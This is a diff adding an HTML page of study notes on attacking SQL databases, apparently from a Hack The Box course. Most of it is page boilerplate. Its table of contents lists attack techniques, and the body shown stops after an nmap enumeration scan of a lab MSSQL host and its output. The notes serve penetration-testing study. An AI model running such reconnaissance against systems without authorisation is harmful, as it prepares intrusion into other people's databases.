@@ -1,0 +1,899 @@
+<!DOCTYPE HTML>
+<html lang="en" class="light sidebar-visible" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>SQL - Cybersecurity Notes</title>
+
+
+        <!-- Custom HTML head -->
+
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="../../../favicon.svg">
+        <link rel="shortcut icon" href="../../../favicon.png">
+        <link rel="stylesheet" href="../../../css/variables.css">
+        <link rel="stylesheet" href="../../../css/general.css">
+        <link rel="stylesheet" href="../../../css/chrome.css">
+        <link rel="stylesheet" href="../../../css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../../../fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" id="highlight-css" href="../../../highlight.css">
+        <link rel="stylesheet" id="tomorrow-night-css" href="../../../tomorrow-night.css">
+        <link rel="stylesheet" id="ayu-highlight-css" href="../../../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+
+        <!-- Provide site root and default themes to javascript -->
+        <script>
+            const path_to_root = "../../../";
+            const default_light_theme = "light";
+            const default_dark_theme = "navy";
+            window.path_to_searchindex_js = "../../../searchindex.js";
+        </script>
+        <!-- Start loading toc.js asap -->
+        <script src="../../../toc.js"></script>
+    </head>
+    <body>
+    <div id="mdbook-help-container">
+        <div id="mdbook-help-popup">
+            <h2 class="mdbook-help-title">Keyboard shortcuts</h2>
+            <div>
+                <p>Press <kbd>←</kbd> or <kbd>→</kbd> to navigate between chapters</p>
+                <p>Press <kbd>S</kbd> or <kbd>/</kbd> to search in the book</p>
+                <p>Press <kbd>?</kbd> to show this help</p>
+                <p>Press <kbd>Esc</kbd> to hide this help</p>
+            </div>
+        </div>
+    </div>
+    <div id="body-container">
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                let theme = localStorage.getItem('mdbook-theme');
+                let sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            const default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? default_dark_theme : default_light_theme;
+            let theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            const html = document.documentElement;
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add("js");
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            let sidebar = null;
+            const sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+                sidebar_toggle.checked = false;
+            }
+            if (sidebar === 'visible') {
+                sidebar_toggle.checked = true;
+            } else {
+                html.classList.remove('sidebar-visible');
+            }
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <!-- populated by js -->
+            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+            <noscript>
+                <iframe class="sidebar-iframe-outer" src="../../../toc.html"></iframe>
+            </noscript>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="default_theme">Auto</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search (`/`)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="/ s" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">Cybersecurity Notes</h1>
+
+                    <div class="right-buttons">
+                        <a href="../../../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <div class="search-wrapper">
+                            <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                            <div class="spinner-wrapper">
+                                <i class="fa fa-spinner fa-spin"></i>
+                            </div>
+                        </div>
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <style>
+.mdbook-callouts {
+  padding: 8px 16px;
+  margin-bottom: 16px;
+  border-radius: 4px;
+  /* border-left: 0.25em solid var(--mdbook-callouts-color); */
+  background: var(--mdbook-callouts-background);
+}
+
+.mdbook-callouts > *:first-child {
+  margin-top: 0;
+}
+
+.mdbook-callouts > *:last-child {
+  margin-bottom: 0;
+}
+
+.mdbook-callouts-title {
+  display: flex;
+  font-weight: 600;
+  align-items: center;
+  line-height: 1;
+  color: var(--mdbook-callouts-color);
+  text-transform: capitalize;
+}
+
+.mdbook-callouts-icon {
+  display: inline-block;
+  width: 1em;
+  height: 1em;
+  margin-right: 0.2em;
+  background-color: currentColor;
+  -webkit-mask: no-repeat center / 100%;
+  mask: no-repeat center / 100%;
+  -webkit-mask-image: var(--mdbook-callouts-icon);
+  mask-image: var(--mdbook-callouts-icon);
+}
+
+/* icons at: https://lucide.dev/icons/ */
+
+.mdbook-callouts-info {
+  --mdbook-callouts-color: rgb(var(--color-blue-rgb));
+  --mdbook-callouts-background: rgba(var(--color-blue-rgb), 0.1);
+  /* https://lucide.dev/icons/info */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWluZm8iPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjEwIi8+PHBhdGggZD0iTTEyIDE2di00Ii8+PHBhdGggZD0iTTEyIDhoLjAxIi8+PC9zdmc+');
+}
+
+.mdbook-callouts-note {
+  --mdbook-callouts-color: rgb(var(--color-blue-rgb));
+  --mdbook-callouts-background: rgba(var(--color-blue-rgb), 0.1);
+  /* https://lucide.dev/icons/pencil */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLXBlbmNpbCI+PHBhdGggZD0iTTE3IDNhMi44NSAyLjgzIDAgMSAxIDQgNEw3LjUgMjAuNSAyIDIybDEuNS01LjVaIi8+PHBhdGggZD0ibTE1IDUgNCA0Ii8+PC9zdmc+');
+}
+
+.mdbook-callouts-tip,
+.mdbook-callouts-hint {
+  --mdbook-callouts-color: rgb(var(--color-cyan-rgb));
+  --mdbook-callouts-background: rgba(var(--color-cyan-rgb), 0.1);
+  /* https://lucide.dev/icons/flame */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWZsYW1lIj48cGF0aCBkPSJNOC41IDE0LjVBMi41IDIuNSAwIDAgMCAxMSAxMmMwLTEuMzgtLjUtMi0xLTMtMS4wNzItMi4xNDMtLjIyNC00LjA1NCAyLTYgLjUgMi41IDIgNC45IDQgNi41IDIgMS42IDMgMy41IDMgNS41YTcgNyAwIDEgMS0xNCAwYzAtMS4xNTMuNDMzLTIuMjk0IDEtM2EyLjUgMi41IDAgMCAwIDIuNSAyLjV6Ii8+PC9zdmc+');
+}
+
+.mdbook-callouts-important {
+  --mdbook-callouts-color: rgb(var(--color-purple-rgb));
+  --mdbook-callouts-background: rgba(var(--color-purple-rgb), 0.1);
+  /* https://lucide.dev/icons/alert-circle */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWFsZXJ0LWNpcmNsZSI+PGNpcmNsZSBjeD0iMTIiIGN5PSIxMiIgcj0iMTAiLz48bGluZSB4MT0iMTIiIHgyPSIxMiIgeTE9IjgiIHkyPSIxMiIvPjxsaW5lIHgxPSIxMiIgeDI9IjEyLjAxIiB5MT0iMTYiIHkyPSIxNiIvPjwvc3ZnPg==');
+}
+
+.mdbook-callouts-success,
+.mdbook-callouts-check,
+.mdbook-callouts-done {
+  --mdbook-callouts-color: rgb(var(--color-green-rgb));
+  --mdbook-callouts-background: rgba(var(--color-green-rgb), 0.1);
+  /* https://lucide.dev/icons/check */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWNoZWNrIj48cGF0aCBkPSJNMjAgNiA5IDE3bC01LTUiLz48L3N2Zz4=');
+}
+
+.mdbook-callouts-question,
+.mdbook-callouts-help,
+.mdbook-callouts-faq {
+  --mdbook-callouts-color: rgb(var(--color-pink-rgb));
+  --mdbook-callouts-background: rgba(var(--color-pink-rgb), 0.1);
+  /* https://lucide.dev/icons/help-circle */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWhlbHAtY2lyY2xlIj48Y2lyY2xlIGN4PSIxMiIgY3k9IjEyIiByPSIxMCIvPjxwYXRoIGQ9Ik05LjA5IDlhMyAzIDAgMCAxIDUuODMgMWMwIDItMyAzLTMgMyIvPjxwYXRoIGQ9Ik0xMiAxN2guMDEiLz48L3N2Zz4=');
+}
+
+.mdbook-callouts-warning,
+.mdbook-callouts-warn {
+  --mdbook-callouts-color: rgb(var(--color-orange-rgb));
+  --mdbook-callouts-background: rgba(var(--color-orange-rgb), 0.1);
+  /* https://lucide.dev/icons/alert-triangle */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWFsZXJ0LXRyaWFuZ2xlIj48cGF0aCBkPSJtMjEuNzMgMTgtOC0xNGEyIDIgMCAwIDAtMy40OCAwbC04IDE0QTIgMiAwIDAgMCA0IDIxaDE2YTIgMiAwIDAgMCAxLjczLTNaIi8+PHBhdGggZD0iTTEyIDl2NCIvPjxwYXRoIGQ9Ik0xMiAxN2guMDEiLz48L3N2Zz4=');
+}
+
+.mdbook-callouts-caution {
+  --mdbook-callouts-color: rgb(var(--color-red-rgb));
+  --mdbook-callouts-background: rgba(var(--color-red-rgb), 0.1);
+  /* https://lucide.dev/icons/shield-alert */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLXNoaWVsZC1hbGVydCI+PHBhdGggZD0iTTEyIDIyczgtNCA4LTEwVjVsLTgtMy04IDN2N2MwIDYgOCAxMCA4IDEwIi8+PHBhdGggZD0iTTEyIDh2NCIvPjxwYXRoIGQ9Ik0xMiAxNmguMDEiLz48L3N2Zz4=');
+}
+
+.mdbook-callouts-failure,
+.mdbook-callouts-fail,
+.mdbook-callouts-missing {
+  --mdbook-callouts-color: rgb(var(--color-red-rgb));
+  --mdbook-callouts-background: rgba(var(--color-red-rgb), 0.1);
+  /* https://lucide.dev/icons/x */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLXgiPjxwYXRoIGQ9Ik0xOCA2IDYgMTgiLz48cGF0aCBkPSJtNiA2IDEyIDEyIi8+PC9zdmc+');
+}
+
+.mdbook-callouts-error,
+.mdbook-callouts-danger {
+  --mdbook-callouts-color: rgb(var(--color-red-rgb));
+  --mdbook-callouts-background: rgba(var(--color-red-rgb), 0.1);
+  /* https://lucide.dev/icons/zap */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLXphcCI+PHBvbHlnb24gcG9pbnRzPSIxMyAyIDMgMTQgMTIgMTQgMTEgMjIgMjEgMTAgMTIgMTAgMTMgMiIvPjwvc3ZnPg==');
+}
+
+.mdbook-callouts-bug {
+  --mdbook-callouts-color: rgb(var(--color-red-rgb));
+  --mdbook-callouts-background: rgba(var(--color-red-rgb), 0.1);
+  /* https://lucide.dev/icons/bug */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWJ1ZyI+PHBhdGggZD0ibTggMiAxLjg4IDEuODgiLz48cGF0aCBkPSJNMTQuMTIgMy44OCAxNiAyIi8+PHBhdGggZD0iTTkgNy4xM3YtMWEzLjAwMyAzLjAwMyAwIDEgMSA2IDB2MSIvPjxwYXRoIGQ9Ik0xMiAyMGMtMy4zIDAtNi0yLjctNi02di0zYTQgNCAwIDAgMSA0LTRoNGE0IDQgMCAwIDEgNCA0djNjMCAzLjMtMi43IDYtNiA2Ii8+PHBhdGggZD0iTTEyIDIwdi05Ii8+PHBhdGggZD0iTTYuNTMgOUM0LjYgOC44IDMgNy4xIDMgNSIvPjxwYXRoIGQ9Ik02IDEzSDIiLz48cGF0aCBkPSJNMyAyMWMwLTIuMSAxLjctMy45IDMuOC00Ii8+PHBhdGggZD0iTTIwLjk3IDVjMCAyLjEtMS42IDMuOC0zLjUgNCIvPjxwYXRoIGQ9Ik0yMiAxM2gtNCIvPjxwYXRoIGQ9Ik0xNy4yIDE3YzIuMS4xIDMuOCAxLjkgMy44IDQiLz48L3N2Zz4=');
+}
+
+.mdbook-callouts-examples,
+.mdbook-callouts-example {
+  --mdbook-callouts-color: rgb(var(--color-purple-rgb));
+  --mdbook-callouts-background: rgba(var(--color-purple-rgb), 0.1);
+  /* https://lucide.dev/icons/list */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWxpc3QiPjxsaW5lIHgxPSI4IiB4Mj0iMjEiIHkxPSI2IiB5Mj0iNiIvPjxsaW5lIHgxPSI4IiB4Mj0iMjEiIHkxPSIxMiIgeTI9IjEyIi8+PGxpbmUgeDE9IjgiIHgyPSIyMSIgeTE9IjE4IiB5Mj0iMTgiLz48bGluZSB4MT0iMyIgeDI9IjMuMDEiIHkxPSI2IiB5Mj0iNiIvPjxsaW5lIHgxPSIzIiB4Mj0iMy4wMSIgeTE9IjEyIiB5Mj0iMTIiLz48bGluZSB4MT0iMyIgeDI9IjMuMDEiIHkxPSIxOCIgeTI9IjE4Ii8+PC9zdmc+');
+}
+
+.mdbook-callouts-quote {
+  --mdbook-callouts-color: rgb(158, 158, 158);
+  --mdbook-callouts-background: rgba(158, 158, 158, 0.1);
+  /* https://lucide.dev/icons/quote */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLXF1b3RlIj48cGF0aCBkPSJNMyAyMWMzIDAgNy0xIDctOFY1YzAtMS4yNS0uNzU2LTIuMDE3LTItMkg0Yy0xLjI1IDAtMiAuNzUtMiAxLjk3MlYxMWMwIDEuMjUuNzUgMiAyIDIgMSAwIDEgMCAxIDF2MWMwIDEtMSAyLTIgMnMtMSAuMDA4LTEgMS4wMzFWMjBjMCAxIDAgMSAxIDF6Ii8+PHBhdGggZD0iTTE1IDIxYzMgMCA3LTEgNy04VjVjMC0xLjI1LS43NTctMi4wMTctMi0yaC00Yy0xLjI1IDAtMiAuNzUtMiAxLjk3MlYxMWMwIDEuMjUuNzUgMiAyIDJoLjc1YzAgMi4yNS4yNSA0LTIuNzUgNHYzYzAgMSAwIDEgMSAxeiIvPjwvc3ZnPg==');
+}
+
+
+.ayu {
+  --color-red-rgb: 251, 70, 76;
+  --color-red: #fb464c;
+  --color-orange-rgb: 233, 151, 63;
+  --color-orange: #e9973f;
+  --color-yellow-rgb: 224, 222, 113;
+  --color-yellow: #e0de71;
+  --color-green-rgb: 68, 207, 110;
+  --color-green: #44cf6e;
+  --color-cyan-rgb: 83, 223, 221;
+  --color-cyan: #53dfdd;
+  --color-blue-rgb: 2, 122, 255;
+  --color-blue: #027aff;
+  --color-purple-rgb: 168, 130, 255;
+  --color-purple: #a882ff;
+  --color-pink-rgb: 250, 153, 205;
+  --color-pink: #fa99cd;
+}
+
+.light {
+  --color-red-rgb: 233, 49, 71;
+  --color-red: #e93147;
+  --color-orange-rgb: 236, 117, 0;
+  --color-orange: #ec7500;
+  --color-yellow-rgb: 224, 172, 0;
+  --color-yellow: #e0ac00;
+  --color-green-rgb: 8, 185, 78;
+  --color-green: #08b94e;
+  --color-cyan-rgb: 0, 191, 188;
+  --color-cyan: #00bfbc;
+  --color-blue-rgb: 8, 109, 221;
+  --color-blue: #086ddd;
+  --color-purple-rgb: 120, 82, 238;
+  --color-purple: #7852ee;
+  --color-pink-rgb: 213, 57, 132;
+  --color-pink: #d53984;
+}
+
+.coal {
+  --color-red-rgb: 251, 70, 76;
+  --color-red: #fb464c;
+  --color-orange-rgb: 233, 151, 63;
+  --color-orange: #e9973f;
+  --color-yellow-rgb: 224, 222, 113;
+  --color-yellow: #e0de71;
+  --color-green-rgb: 68, 207, 110;
+  --color-green: #44cf6e;
+  --color-cyan-rgb: 83, 223, 221;
+  --color-cyan: #53dfdd;
+  --color-blue-rgb: 2, 122, 255;
+  --color-blue: #027aff;
+  --color-purple-rgb: 168, 130, 255;
+  --color-purple: #a882ff;
+  --color-pink-rgb: 250, 153, 205;
+  --color-pink: #fa99cd;
+}
+
+.navy {
+  --color-red-rgb: 251, 70, 76;
+  --color-red: #fb464c;
+  --color-orange-rgb: 233, 151, 63;
+  --color-orange: #e9973f;
+  --color-yellow-rgb: 224, 222, 113;
+  --color-yellow: #e0de71;
+  --color-green-rgb: 68, 207, 110;
+  --color-green: #44cf6e;
+  --color-cyan-rgb: 83, 223, 221;
+  --color-cyan: #53dfdd;
+  --color-blue-rgb: 2, 122, 255;
+  --color-blue: #027aff;
+  --color-purple-rgb: 168, 130, 255;
+  --color-purple: #a882ff;
+  --color-pink-rgb: 250, 153, 205;
+  --color-pink: #fa99cd;
+}
+
+.rust {
+  --color-red-rgb: 233, 49, 71;
+  --color-red: #e93147;
+  --color-orange-rgb: 236, 117, 0;
+  --color-orange: #ec7500;
+  --color-yellow-rgb: 224, 172, 0;
+  --color-yellow: #e0ac00;
+  --color-green-rgb: 8, 185, 78;
+  --color-green: #08b94e;
+  --color-cyan-rgb: 0, 191, 188;
+  --color-cyan: #00bfbc;
+  --color-blue-rgb: 8, 109, 221;
+  --color-blue: #086ddd;
+  --color-purple-rgb: 120, 82, 238;
+  --color-purple: #7852ee;
+  --color-pink-rgb: 213, 57, 132;
+  --color-pink: #d53984;
+}
+</style>
+<ul>
+<li><a href="#attacking-sql">Attacking SQL</a>
+<ul>
+<li><a href="#enumeration">Enumeration</a></li>
+<li><a href="#authentication-methods">Authentication Methods</a></li>
+<li><a href="#misconfigurations">Misconfigurations</a>
+<ul>
+<li><a href="#privileges">Privileges</a></li>
+</ul>
+</li>
+<li><a href="#protocol-specific-attacks">Protocol Specific Attacks</a>
+<ul>
+<li><a href="#sql-default-databases">SQL Default Databases</a>
+<ul>
+<li><a href="#mysql-default-system-schemasdatabases">MySQL Default System Schemas/Databases</a></li>
+<li><a href="#mssql-default-system-schemasdatabases">MSSQL Default System Schemas/Databases</a></li>
+</ul>
+</li>
+<li><a href="#readchange-the-database">Read/Change the Database</a></li>
+<li><a href="#execute-commands">Execute Commands</a></li>
+<li><a href="#write-local-files">Write Local Files</a></li>
+<li><a href="#read-local-files">Read Local Files</a></li>
+<li><a href="#capture-mssql-service-hash">Capture MSSQL Service Hash</a></li>
+<li><a href="#impersonate-existing-users-with-mssql">Impersonate Existing Users with MSSQL</a></li>
+<li><a href="#communicate-with-other-dbs-with-mssql">Communicate with Other DBs with MSSQL</a></li>
+</ul>
+</li>
+<li><a href="#latest-vulnerabilities">Latest Vulnerabilities</a>
+<ul>
+<li><a href="#no-cve">NO CVE</a>
+<ul>
+<li><a href="#concept-of-the-attack">Concept of the Attack</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<hr />
+<h1 id="attacking-sql"><a class="header" href="#attacking-sql">Attacking SQL</a></h1>
+<h2 id="enumeration"><a class="header" href="#enumeration">Enumeration</a></h2>
+<p>By default MSSQL uses ports TCP71433 and UDP/1434, and MySQL uses TCP/3306. However, when MSSQL operates in a "hidden" mode, it uses TCP/2433 port. You can use Nmap's default scripts <code>-sC</code> option to enumerate database services on a target system.</p>
+<pre><code class="language-bash">d41y@htb[/htb]$ nmap -Pn -sV -sC -p1433 10.10.10.125
+
+Host discovery disabled (-Pn). All addresses will be marked 'up', and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-26 02:09 BST
+Nmap scan report for 10.10.10.125
+Host is up (0.0099s latency).
+
+PORT     STATE SERVICE  VERSION
+1433/tcp open  ms-sql-s Microsoft SQL Server 2017 14.00.1000.00; RTM
+| ms-sql-ntlm-info: 
+|   Target_Name: HTB
+|   NetBIOS_Domain_Name: HTB
+|   NetBIOS_Computer_Name: mssql-test
+|   DNS_Domain_Name: HTB.LOCAL
+|   DNS_Computer_Name: mssql-test.HTB.LOCAL
+|   DNS_Tree_Name: HTB.LOCAL
+|_  Product_Version: 10.0.17763
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2021-08-26T01:04:36
+|_Not valid after:  2051-08-26T01:04:36
+|_ssl-date: 2021-08-26T01:11:58+00:00; +2m05s from scanner time.
+
+Host script results:
+|_clock-skew: mean: 2m04s, deviation: 0s, median: 2m04s
+| ms-sql-info: 
+|   10.10.10.125:1433: 
+|     Version: 
+|       name: Microsoft SQL Server 2017 RTM
+|       number: 14.00.1000.00
+|       Product: Microsoft SQL Server 2017
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+</code></pre>
+<p>The scan reveals essential information about the target, like the version and hostname, which you can use to identify common misconfigurations, specific attacks, or known vulnerabilities.</p>
+<h2 id="authentication-methods"><a class="header" href="#authentication-methods">Authentication Methods</a></h2>
+<p>MSSQL supports two authentication methods, which means that users can be created in Windows or the SQL server:</p>
